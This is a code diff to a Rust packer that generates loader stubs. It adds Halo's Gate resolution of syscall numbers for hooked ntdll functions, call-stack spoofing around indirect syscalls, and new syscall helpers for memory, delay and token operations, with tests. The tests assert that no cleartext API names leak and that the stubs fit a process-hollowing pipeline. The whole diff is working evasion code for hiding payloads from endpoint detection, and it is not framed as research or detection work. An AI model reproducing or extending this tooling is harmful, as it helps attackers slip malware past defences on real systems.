@@ -26,14 +26,14 @@ use std::collections::BTreeSet;
 use serde::{Deserialize, Serialize};
 
 use crate::error::{PackerError, Result};
-use crate::plan::schema::PayloadFormat;
-use crate::techniques::{stack_spoofing, RuntimeStep};
+use crate::techniques::RuntimeStep;
 
 use super::obfuscation::StringsConfig;
 
 mod pe_file;
 mod prelude;
 pub mod resolvers;
+pub mod stack_spoofing;
 
 /// Raw `build.stub.syscalls` YAML block, before semantic validation.
 ///
@@ -50,6 +50,19 @@ pub struct YamlSyscallsPlan {
     /// SSN resolver (`hells_gate` or `tartarus_gate`).
     #[serde(default = "default_resolver")]
     pub resolver: String,
+
+    /// Fabricate ntdll-shaped frames around every indirect syscall.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub stack_spoofing: Option<YamlStackSpoofing>,
+}
+
+/// `build.stub.syscalls.stack_spoofing`: the stack half of the syscall layer.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct YamlStackSpoofing {
+    /// Bytes of decoy stack written below `Rsp` before every syscall.
+    #[serde(default = "stack_spoofing::default_decoy_bytes")]
+    pub decoy_bytes: usize,
 }
 
 fn default_mode() -> String {
@@ -92,6 +105,9 @@ pub enum Resolver {
     /// walking a clean copy of ntdll read from disk, so neither `GetProcAddress`
     /// nor any function-name string is needed.
     ApiHash,
+    /// Halo's Gate: read the SSN from the live export stub when it is intact
+    /// and derive it from the nearest intact neighbour when an EDR hooked it.
+    HalosGate,
 }
 
 impl Resolver {
@@ -101,6 +117,7 @@ impl Resolver {
             Resolver::HellsGate => "hells_gate",
             Resolver::TartarusGate => "tartarus_gate",
             Resolver::ApiHash => "api_hash",
+            Resolver::HalosGate => "halos_gate",
         }
     }
 }
@@ -112,6 +129,8 @@ pub struct SyscallsConfig {
     pub mode: SyscallsMode,
     /// How the SSNs are resolved when the mode is `indirect`.
     pub resolver: Resolver,
+    /// Fabricate ntdll-shaped frames around every indirect syscall.
+    pub stack_spoofing: Option<stack_spoofing::Params>,
 }
 
 impl Default for SyscallsConfig {
@@ -119,6 +138,7 @@ impl Default for SyscallsConfig {
         Self {
             mode: SyscallsMode::None,
             resolver: Resolver::HellsGate,
+            stack_spoofing: None,
         }
     }
 }
@@ -147,15 +167,37 @@ impl SyscallsConfig {
             "hells_gate" => Resolver::HellsGate,
             "tartarus_gate" => Resolver::TartarusGate,
             "api_hash" => Resolver::ApiHash,
+            "halos_gate" => Resolver::HalosGate,
             other => {
                 return Err(PackerError::Validation(format!(
                     "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate', \
-                     'tartarus_gate' or 'api_hash'"
+                     'tartarus_gate', 'api_hash' or 'halos_gate'"
                 )));
             }
         };
 
-        Ok(Self { mode, resolver })
+        let stack_spoofing = match &yaml.stack_spoofing {
+            Some(spoofing) => {
+                if mode != SyscallsMode::Indirect {
+                    return Err(PackerError::Validation(
+                        "build.stub.syscalls.stack_spoofing requires \
+                         'build.stub.syscalls.mode: indirect': it rewrites the indirect trampoline, \
+                         which 'none' does not emit"
+                            .to_string(),
+                    ));
+                }
+                Some(stack_spoofing::Params {
+                    decoy_bytes: spoofing.decoy_bytes,
+                })
+            }
+            None => None,
+        };
+
+        Ok(Self {
+            mode,
+            resolver,
+            stack_spoofing,
+        })
     }
 }
 
@@ -556,6 +598,64 @@ const PROTECT_VM_INDIRECT: &str = r#"    /// NtProtectVirtualMemory(ProcessHandl
                 0,
                 0,
                 ssns.protect_vm,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_free_vm`, mode none: `VirtualFree` mapped to an NTSTATUS.
+///
+/// `VirtualFree` only releases the calling process, so the process handle is
+/// ignored; `MEM_RELEASE` requires `size` to be zero, exactly as the Win32 API
+/// documents.
+const FREE_VM_NONE: &str = r#"    /// NtFreeVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize, FreeType).
+    /// None mode: VirtualFree mapped to an NTSTATUS (current process only).
+    pub fn nt_free_vm(
+        _process: HANDLE,
+        base: *mut *mut core::ffi::c_void,
+        size: *mut usize,
+        free_type: u32,
+    ) -> i32 {
+        let address = unsafe { *base };
+        let region = unsafe { *size };
+        unsafe {
+            match VirtualFree(address, region, VIRTUAL_FREE_TYPE(free_type)) {
+                Ok(()) => STATUS_SUCCESS,
+                Err(_) => STATUS_UNSUCCESSFUL,
+            }
+        }
+    }
+"#;
+
+/// `nt_free_vm`, mode indirect: syscall with the resolved SSN.
+const FREE_VM_INDIRECT: &str = r#"    /// NtFreeVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize, FreeType).
+    pub fn nt_free_vm(
+        process: HANDLE,
+        base: *mut *mut core::ffi::c_void,
+        size: *mut usize,
+        free_type: u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                process.0 as usize,
+                base as usize,
+                size as usize,
+                free_type as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.free_vm,
                 *gadget,
             )
         }
@@ -1000,7 +1100,178 @@ const CLOSE_NONE: &str = r#"    /// NtClose(Handle). None mode: CloseHandle mapp
     }
 "#;
 
+/// `nt_delay_execution`, mode none: resolve the export dynamically.
+const DELAY_EXECUTION_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type DelayExecutionFn = unsafe extern "system" fn(u8, *const i64) -> i32;
+
+    /// NtDelayExecution(Alertable, &DelayInterval). None mode: resolve the
+    /// export dynamically (windows-rs does not declare it).
+    pub fn nt_delay_execution(alertable: u8, interval: *const i64) -> i32 {
+        let address = resolve_nt_export(&$DELAY_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let delay: DelayExecutionFn = unsafe { std::mem::transmute(address) };
+        unsafe { delay(alertable, interval) }
+    }
+"#;
+
+/// `nt_delay_execution`, mode indirect: syscall with the resolved SSN.
+const DELAY_EXECUTION_INDIRECT: &str = r#"    /// NtDelayExecution(Alertable, &DelayInterval).
+    pub fn nt_delay_execution(alertable: u8, interval: *const i64) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                alertable as usize,
+                interval as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.delay_execution,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 /// `nt_close`, mode indirect.
+/// `nt_query_vm`, mode none: resolve the export dynamically.
+const QUERY_VM_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type QueryVmFn = unsafe extern "system" fn(
+        HANDLE,
+        *const core::ffi::c_void,
+        u32,
+        *mut core::ffi::c_void,
+        usize,
+        *mut usize,
+    ) -> i32;
+
+    /// NtQueryVirtualMemory(ProcessHandle, BaseAddress, MemoryInformationClass,
+    /// MemoryInformation, MemoryInformationLength, ReturnLength). None mode:
+    /// resolve the export dynamically (windows-rs does not declare it).
+    pub fn nt_query_vm(
+        process: HANDLE,
+        base: *const core::ffi::c_void,
+        class: u32,
+        info: *mut core::ffi::c_void,
+        info_len: usize,
+        return_len: *mut usize,
+    ) -> i32 {
+        let address = resolve_nt_export(&$QUERY_VM_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let query: QueryVmFn = unsafe { std::mem::transmute(address) };
+        unsafe { query(process, base, class, info, info_len, return_len) }
+    }
+"#;
+
+/// `nt_query_vm`, mode indirect: syscall with the resolved SSN.
+const QUERY_VM_INDIRECT: &str = r#"    /// NtQueryVirtualMemory(ProcessHandle, BaseAddress, MemoryInformationClass,
+    /// MemoryInformation, MemoryInformationLength, ReturnLength).
+    pub fn nt_query_vm(
+        process: HANDLE,
+        base: *const core::ffi::c_void,
+        class: u32,
+        info: *mut core::ffi::c_void,
+        info_len: usize,
+        return_len: *mut usize,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                process.0 as usize,
+                base as usize,
+                class as usize,
+                info as usize,
+                info_len,
+                return_len as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.query_vm,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_open_thread_token`, mode none: the advapi32 wrapper mapped to an
+/// NTSTATUS.
+const OPEN_THREAD_TOKEN_NONE: &str = r#"    /// NtOpenThreadToken(ThreadHandle, DesiredAccess, OpenAsSelf, &TokenHandle).
+    /// None mode: OpenThreadToken mapped to an NTSTATUS.
+    pub fn nt_open_thread_token(
+        thread: HANDLE,
+        access: u32,
+        open_as_self: u8,
+        token: *mut core::ffi::c_void,
+    ) -> i32 {
+        unsafe {
+            match OpenThreadToken(
+                thread,
+                TOKEN_ACCESS_MASK(access),
+                windows::Win32::Foundation::BOOL(open_as_self as i32),
+                token as *mut HANDLE,
+            ) {
+                Ok(()) => STATUS_SUCCESS,
+                Err(_) => STATUS_UNSUCCESSFUL,
+            }
+        }
+    }
+"#;
+
+/// `nt_open_thread_token`, mode indirect: syscall with the resolved SSN.
+const OPEN_THREAD_TOKEN_INDIRECT: &str = r#"    /// NtOpenThreadToken(ThreadHandle, DesiredAccess, OpenAsSelf, &TokenHandle).
+    pub fn nt_open_thread_token(
+        thread: HANDLE,
+        access: u32,
+        open_as_self: u8,
+        token: *mut core::ffi::c_void,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                access as usize,
+                open_as_self as usize,
+                token as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.open_thread_token,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 const CLOSE_INDIRECT: &str = r#"    /// NtClose(Handle).
     pub fn nt_close(handle: HANDLE) -> i32 {
         let Some(ssns) = SSNS.get() else {
@@ -1097,17 +1368,15 @@ const OPEN_PROCESS_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export r
     type OpenProcessTokenFn = unsafe extern "system" fn(
         HANDLE,
         u32,
-        *const core::ffi::c_void,
         *mut core::ffi::c_void,
     ) -> i32;
 
-    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &ObjectAttributes,
-    /// &TokenHandle). None mode: resolve the export dynamically (windows-rs does
-    /// not declare it) and call it.
+    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &TokenHandle). None mode:
+    /// resolve the export dynamically (windows-rs does not declare it) and call
+    /// it.
     pub fn nt_open_process_token(
         process: HANDLE,
         access: u32,
-        attributes: *const core::ffi::c_void,
         token: *mut core::ffi::c_void,
     ) -> i32 {
         let address = resolve_nt_export(&$OPEN_PROCESS_TOKEN_FUNC_DEF$);
@@ -1115,17 +1384,15 @@ const OPEN_PROCESS_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export r
             return STATUS_UNSUCCESSFUL;
         }
         let open: OpenProcessTokenFn = unsafe { std::mem::transmute(address) };
-        unsafe { open(process, access, attributes, token) }
+        unsafe { open(process, access, token) }
     }
 "#;
 
 /// `nt_open_process_token`, mode indirect.
-const OPEN_PROCESS_TOKEN_INDIRECT: &str = r#"    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &ObjectAttributes,
-    /// &TokenHandle).
+const OPEN_PROCESS_TOKEN_INDIRECT: &str = r#"    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &TokenHandle).
     pub fn nt_open_process_token(
         process: HANDLE,
         access: u32,
-        attributes: *const core::ffi::c_void,
         token: *mut core::ffi::c_void,
     ) -> i32 {
         let Some(ssns) = SSNS.get() else {
@@ -1138,8 +1405,8 @@ const OPEN_PROCESS_TOKEN_INDIRECT: &str = r#"    /// NtOpenProcessToken(ProcessH
             nt_invoke(
                 process.0 as usize,
                 access as usize,
-                attributes as usize,
                 token as usize,
+                0,
                 0,
                 0,
                 0,
@@ -1161,19 +1428,19 @@ const DUPLICATE_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export reso
         HANDLE,
         u32,
         *const core::ffi::c_void,
-        i32,
+        u8,
         i32,
         *mut core::ffi::c_void,
     ) -> i32;
 
     /// NtDuplicateToken(ExistingTokenHandle, DesiredAccess, &ObjectAttributes,
-    /// ImpersonationLevel, TokenType, &NewTokenHandle). None mode: resolve the
-    /// export dynamically (windows-rs does not declare it) and call it.
+    /// EffectiveOnly, TokenType, &NewTokenHandle). None mode: resolve the export
+    /// dynamically (windows-rs does not declare it) and call it.
     pub fn nt_duplicate_token(
         existing: HANDLE,
         access: u32,
         attributes: *const core::ffi::c_void,
-        level: i32,
+        effective_only: u8,
         token_type: i32,
         new_token: *mut core::ffi::c_void,
     ) -> i32 {
@@ -1182,18 +1449,18 @@ const DUPLICATE_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export reso
             return STATUS_UNSUCCESSFUL;
         }
         let duplicate: DuplicateTokenFn = unsafe { std::mem::transmute(address) };
-        unsafe { duplicate(existing, access, attributes, level, token_type, new_token) }
+        unsafe { duplicate(existing, access, attributes, effective_only, token_type, new_token) }
     }
 "#;
 
 /// `nt_duplicate_token`, mode indirect.
 const DUPLICATE_TOKEN_INDIRECT: &str = r#"    /// NtDuplicateToken(ExistingTokenHandle, DesiredAccess, &ObjectAttributes,
-    /// ImpersonationLevel, TokenType, &NewTokenHandle).
+    /// EffectiveOnly, TokenType, &NewTokenHandle).
     pub fn nt_duplicate_token(
         existing: HANDLE,
         access: u32,
         attributes: *const core::ffi::c_void,
-        level: i32,
+        effective_only: u8,
         token_type: i32,
         new_token: *mut core::ffi::c_void,
     ) -> i32 {
@@ -1208,7 +1475,7 @@ const DUPLICATE_TOKEN_INDIRECT: &str = r#"    /// NtDuplicateToken(ExistingToken
                 existing.0 as usize,
                 access as usize,
                 attributes as usize,
-                level as usize,
+                effective_only as usize,
                 token_type as usize,
                 new_token as usize,
                 0,
@@ -1639,6 +1906,23 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         }),
     },
     NtFunction {
+        name: "NtFreeVirtualMemory",
+        table_field: "free_vm",
+        helper_name: "nt_free_vm",
+        helper_none: FREE_VM_NONE,
+        helper_indirect: FREE_VM_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_free_vm",
+            params: &[
+                ("process", P_HANDLE),
+                ("base", "*mut *mut core::ffi::c_void"),
+                ("size", "*mut usize"),
+                ("free_type", "u32"),
+            ],
+            forward: "process, base, size, free_type",
+        }),
+    },
+    NtFunction {
         name: "NtSuspendThread",
         table_field: "suspend_thread",
         helper_name: "nt_suspend_thread",
@@ -1763,6 +2047,54 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         }),
     },
     NtFunction {
+        name: "NtDelayExecution",
+        table_field: "delay_execution",
+        helper_name: "nt_delay_execution",
+        helper_none: DELAY_EXECUTION_NONE,
+        helper_indirect: DELAY_EXECUTION_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_delay_execution",
+            params: &[("alertable", "u8"), ("interval", "*const i64")],
+            forward: "alertable, interval",
+        }),
+    },
+    NtFunction {
+        name: "NtQueryVirtualMemory",
+        table_field: "query_vm",
+        helper_name: "nt_query_vm",
+        helper_none: QUERY_VM_NONE,
+        helper_indirect: QUERY_VM_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_query_vm",
+            params: &[
+                ("process", P_HANDLE),
+                ("base", P_CVOID),
+                ("class", "u32"),
+                ("info", P_PVOID),
+                ("info_len", "usize"),
+                ("return_len", "*mut usize"),
+            ],
+            forward: "process, base, class, info, info_len, return_len",
+        }),
+    },
+    NtFunction {
+        name: "NtOpenThreadToken",
+        table_field: "open_thread_token",
+        helper_name: "nt_open_thread_token",
+        helper_none: OPEN_THREAD_TOKEN_NONE,
+        helper_indirect: OPEN_THREAD_TOKEN_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_open_thread_token",
+            params: &[
+                ("thread", P_HANDLE),
+                ("access", "u32"),
+                ("open_as_self", "u8"),
+                ("token", P_PVOID),
+            ],
+            forward: "thread, access, open_as_self, token",
+        }),
+    },
+    NtFunction {
         name: "NtOpenProcess",
         table_field: "open_process",
         helper_name: "nt_open_process",
@@ -1790,10 +2122,9 @@ const NT_FUNCTIONS: &[NtFunction] = &[
             params: &[
                 ("process", P_HANDLE),
                 ("access", "u32"),
-                ("attributes", P_CVOID),
                 ("token", P_PVOID),
             ],
-            forward: "process, access, attributes, token",
+            forward: "process, access, token",
         }),
     },
     NtFunction {
@@ -1808,11 +2139,11 @@ const NT_FUNCTIONS: &[NtFunction] = &[
                 ("existing", P_HANDLE),
                 ("access", "u32"),
                 ("attributes", P_CVOID),
-                ("level", "i32"),
+                ("effective_only", "u8"),
                 ("token_type", "i32"),
                 ("new_token", P_PVOID),
             ],
-            forward: "existing, access, attributes, level, token_type, new_token",
+            forward: "existing, access, attributes, effective_only, token_type, new_token",
         }),
     },
     NtFunction {
@@ -1949,9 +2280,17 @@ pub fn render_block_with(
                     "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = {resolver}) ---\n// \
                      Indirect syscalls with {resolver} SSN resolution. The Nt* names never\n// appear in \
                      the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
-                     api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
+                     api_hash replaces them with precomputed FNV-1a hashes, and\n// Halo's Gate derives a \
+                     hooked SSN from its neighbours.\n// See docs/techniques/indirect_syscalls.md."
                 ),
-                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings), seed),
+                render_indirect(
+                    plan,
+                    &required,
+                    strings,
+                    plan.stack_spoofing
+                        .map(|params| params.render_fragment(strings)),
+                    seed,
+                ),
             )
         }
     };
@@ -2009,6 +2348,12 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let set_info_thread_def = strings
         .obfuscate("NtSetInformationThread")
         .render_stub_expr("set_info_thread_name");
+    let delay_def = strings
+        .obfuscate("NtDelayExecution")
+        .render_stub_expr("delay_execution_name");
+    let query_vm_def = strings
+        .obfuscate("NtQueryVirtualMemory")
+        .render_stub_expr("query_vm_name");
     let open_process_token_def = strings
         .obfuscate("NtOpenProcessToken")
         .render_stub_expr("open_process_token_name");
@@ -2030,6 +2375,8 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
         .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
         .replace("$SET_INFO_THREAD_FUNC_DEF$", &set_info_thread_def)
+        .replace("$DELAY_FUNC_DEF$", &delay_def)
+        .replace("$QUERY_VM_FUNC_DEF$", &query_vm_def)
         .replace("$OPEN_PROCESS_TOKEN_FUNC_DEF$", &open_process_token_def)
         .replace("$DUPLICATE_TOKEN_FUNC_DEF$", &duplicate_token_def)
 }
@@ -2086,9 +2433,8 @@ fn render_indirect(
         }
     }
 
-    // `stack_spoofing` replaces the raw trampoline with its own `nt_invoke`,
-    // so the technique's block is emitted once, below the helpers it drives (its
-    // step module is skipped by the renderer).
+    // `build.stub.syscalls.stack_spoofing` replaces the raw trampoline with its
+    // own `nt_invoke`, so the block is emitted once, below the helpers it drives.
     let spoofing = match spoofing {
         Some(block) => {
             helpers.push_str(&block);
@@ -2099,7 +2445,10 @@ fn render_indirect(
     };
 
     let resolve = match plan.resolver {
-        Resolver::HellsGate => &resolve_hg,
+        // Hell's Gate and Halo's Gate share the per-function
+        // `resolve_ssn_with_fallback` call; the resolver body defines what that
+        // helper does.
+        Resolver::HellsGate | Resolver::HalosGate => &resolve_hg,
         Resolver::TartarusGate => &resolve_tg,
         Resolver::ApiHash => &resolve_ah,
     };
@@ -2134,19 +2483,9 @@ fn render_indirect(
     out
 }
 
-/// The rendered `stack_spoofing` block, when the runtime selects that technique.
-///
-/// `None` for every other runtime, which is what leaves the raw trampoline in
-/// place under its usual `nt_invoke` name.
-fn spoofing_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> Option<String> {
-    pipeline
-        .iter()
-        .find(|step| step.name() == stack_spoofing::DEF.name)
-        .map(|step| {
-            step.technique
-                .render_fragment(strings, PayloadFormat::Pe, None)
-        })
-}
+// The stack-spoofing block is rendered from the syscall configuration itself
+// (`build.stub.syscalls.stack_spoofing`); it replaces the trampoline instead of
+// running at a position, so it has no `runtime:` step.
 
 /// Extracts the SSN from a Hell's Gate stub prologue.
 ///
@@ -2212,6 +2551,7 @@ mod tests {
         SyscallsConfig {
             mode: SyscallsMode::Indirect,
             resolver: Resolver::HellsGate,
+            ..Default::default()
         }
     }
 
@@ -2219,6 +2559,7 @@ mod tests {
         SyscallsConfig {
             mode: SyscallsMode::Indirect,
             resolver: Resolver::TartarusGate,
+            ..Default::default()
         }
     }
 
@@ -2226,6 +2567,15 @@ mod tests {
         SyscallsConfig {
             mode: SyscallsMode::Indirect,
             resolver: Resolver::ApiHash,
+            ..Default::default()
+        }
+    }
+
+    fn halos() -> SyscallsConfig {
+        SyscallsConfig {
+            mode: SyscallsMode::Indirect,
+            resolver: Resolver::HalosGate,
+            ..Default::default()
         }
     }
 
@@ -2243,6 +2593,7 @@ mod tests {
         let yaml = YamlSyscallsPlan {
             mode: "indirect".into(),
             resolver: "hells_gate".into(),
+            stack_spoofing: None,
         };
         let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("indirect should be valid");
         assert_eq!(plan.mode, SyscallsMode::Indirect);
@@ -2254,6 +2605,7 @@ mod tests {
         let yaml = YamlSyscallsPlan {
             mode: "direct".into(),
             resolver: "hells_gate".into(),
+            stack_spoofing: None,
         };
         let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("direct should fail");
         assert!(
@@ -2267,6 +2619,7 @@ mod tests {
         let yaml = YamlSyscallsPlan {
             mode: "indirect".into(),
             resolver: "tartarus_gate".into(),
+            stack_spoofing: None,
         };
         let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("tartarus_gate should be valid");
         assert_eq!(plan.mode, SyscallsMode::Indirect);
@@ -2278,6 +2631,7 @@ mod tests {
         let yaml = YamlSyscallsPlan {
             mode: "indirect".into(),
             resolver: "api_hash".into(),
+            stack_spoofing: None,
         };
         let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("api_hash should be valid");
         assert_eq!(plan.mode, SyscallsMode::Indirect);
@@ -2285,16 +2639,87 @@ mod tests {
     }
 
     #[test]
-    fn from_yaml_rejects_unknown_resolver() {
+    fn from_yaml_parses_halos_gate() {
         let yaml = YamlSyscallsPlan {
             mode: "indirect".into(),
             resolver: "halos_gate".into(),
+            stack_spoofing: None,
         };
-        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("halos_gate should fail");
+        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("halos_gate should be valid");
+        assert_eq!(plan.mode, SyscallsMode::Indirect);
+        assert_eq!(plan.resolver, Resolver::HalosGate);
+    }
+
+    #[test]
+    fn from_yaml_rejects_unknown_resolver() {
+        let yaml = YamlSyscallsPlan {
+            mode: "indirect".into(),
+            resolver: "freshy_calls".into(),
+            stack_spoofing: None,
+        };
+        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("freshy_calls should fail");
         assert!(
             err.to_string().contains("build.stub.syscalls.resolver"),
             "unclear error: {err}"
         );
+    }
+
+    #[test]
+    fn parses_the_stack_spoofing_block_with_defaults() {
+        let yaml: YamlSyscallsPlan =
+            serde_yml::from_str("mode: indirect\nstack_spoofing: {}\n").expect("valid YAML");
+        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("valid config");
+        assert_eq!(plan.stack_spoofing, Some(stack_spoofing::Params::default()));
+    }
+
+    #[test]
+    fn parses_explicit_decoy_bytes() {
+        let yaml: YamlSyscallsPlan =
+            serde_yml::from_str("mode: indirect\nstack_spoofing:\n  decoy_bytes: 8192\n")
+                .expect("valid YAML");
+        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("valid config");
+        assert_eq!(
+            plan.stack_spoofing,
+            Some(stack_spoofing::Params { decoy_bytes: 8192 })
+        );
+    }
+
+    #[test]
+    fn stack_spoofing_requires_indirect() {
+        let yaml: YamlSyscallsPlan =
+            serde_yml::from_str("mode: none\nstack_spoofing: {}\n").expect("valid YAML");
+        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("none must fail");
+        assert!(
+            err.to_string().contains("stack_spoofing"),
+            "unclear error: {err}"
+        );
+    }
+
+    #[test]
+    fn the_spoofing_block_comes_from_the_config() {
+        let mut config = indirect();
+        config.stack_spoofing = Some(stack_spoofing::Params::default());
+        let block = render_block_with(
+            &config,
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
+        assert!(block.contains(".global nt_invoke"), "{block}");
+        assert!(block.contains("jmp nt_invoke_raw"), "{block}");
+        assert!(block.contains("init_stack_spoofing"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholders: {block}");
+
+        let plain = render_block_with(
+            &indirect(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
+        assert!(plain.contains("fn nt_invoke("), "{plain}");
+        assert!(!plain.contains("init_stack_spoofing"), "{plain}");
     }
 
     #[test]
@@ -2686,6 +3111,37 @@ mod tests {
     }
 
     #[test]
+    fn halos_gate_block_derives_hooked_ssns_from_neighbours() {
+        let block = render_block_with(
+            &halos(),
+            &hollowing_pipeline(),
+            &xor_config(),
+            &[],
+            TEST_SEED,
+        );
+
+        assert!(block.contains("fn neighbour_ssn"), "neighbour walk missing");
+        assert!(
+            block.contains("fn live_export_address"),
+            "the resolver must not depend on GetProcAddress"
+        );
+        assert!(
+            block.contains("resolve_ssn_with_fallback(module, &"),
+            "the per-function call is missing"
+        );
+        assert!(
+            !block.contains("GetProcAddress(module,"),
+            "Halo's Gate resolves the live export through the export table"
+        );
+        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
+        assert!(
+            leaked.is_empty(),
+            "cleartext names/paths leaked outside comments: {leaked:?}"
+        );
+        assert!(!block.contains('$'), "leftover placeholders: {block}");
+    }
+
+    #[test]
     fn none_block_has_no_ssn_resolution() {
         let block = render_block_with(
             &SyscallsConfig::default(),
@@ -2831,15 +3287,15 @@ mod tests {
     fn token_helpers_offer_direct_proxies() {
         let open = nt_proxy_info("NtOpenProcessToken").expect("direct");
         assert_eq!(open.helper_name, "nt_open_process_token");
-        assert_eq!(open.params.len(), 4);
-        assert_eq!(open.forward, "process, access, attributes, token");
+        assert_eq!(open.params.len(), 3);
+        assert_eq!(open.forward, "process, access, token");
 
         let duplicate = nt_proxy_info("NtDuplicateToken").expect("direct");
         assert_eq!(duplicate.helper_name, "nt_duplicate_token");
         assert_eq!(duplicate.params.len(), 6);
         assert_eq!(
             duplicate.forward,
-            "existing, access, attributes, level, token_type, new_token"
+            "existing, access, attributes, effective_only, token_type, new_token"
         );
     }
 
@@ -2853,7 +3309,14 @@ mod tests {
             TEST_SEED,
         );
         assert!(block.contains("pub fn nt_open_process_token"), "{block}");
+        assert!(
+            block.contains(
+                "pub fn nt_open_process_token(\n        process: HANDLE,\n        access: u32,\n        token: *mut core::ffi::c_void,\n    ) -> i32 {"
+            ),
+            "NtOpenProcessToken must take three arguments: {block}"
+        );
         assert!(block.contains("pub fn nt_duplicate_token"), "{block}");
+        assert!(block.contains("effective_only: u8"), "{block}");
         assert!(block.contains("ssns.open_process_token"), "{block}");
         assert!(block.contains("ssns.duplicate_token"), "{block}");
         assert!(!block.contains('$'), "leftover placeholder: {block}");
@@ -2869,6 +3332,13 @@ mod tests {
             TEST_SEED,
         );
         assert!(block.contains("resolve_nt_export(&"), "{block}");
+        assert!(
+            block.contains(
+                "type OpenProcessTokenFn = unsafe extern \"system\" fn(\n        HANDLE,\n        u32,\n        *mut core::ffi::c_void,\n    ) -> i32;"
+            ),
+            "the x86 stdcall typedef must take three arguments: {block}"
+        );
+        assert!(block.contains("effective_only: u8"), "{block}");
         assert!(!block.contains('$'), "leftover placeholder: {block}");
         let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
         assert!(leaked.is_empty(), "cleartext names leaked: {leaked:?}");
